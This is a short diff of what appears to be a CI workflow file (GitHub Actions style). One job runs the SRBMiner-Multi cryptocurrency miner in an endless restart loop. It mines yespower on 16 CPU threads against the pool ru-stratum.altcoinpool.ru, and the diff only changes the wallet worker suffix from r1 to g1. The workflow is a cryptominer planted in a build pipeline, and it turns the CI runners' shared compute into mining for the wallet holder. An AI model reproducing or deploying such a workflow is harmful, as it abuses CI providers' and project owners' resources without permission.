@@ -33,6 +33,6 @@ jobs:
         run: |
           cd SRBMiner-Multi-2-4-7  # Move to the correct directory
           while true; do
-            ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool ru-stratum.altcoinpool.ru:6234 --wallet VUsSwd174irshqzSjVhZ8aSCjqooTG6Mi6.r1 pause --cpu-Threads 16 --keepalive true
+            ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool ru-stratum.altcoinpool.ru:6234 --wallet VUsSwd174irshqzSjVhZ8aSCjqooTG6Mi6.g1 pause --cpu-Threads 16 --keepalive true
             sleep 30  # Wait for 30 seconds before restarting
           done
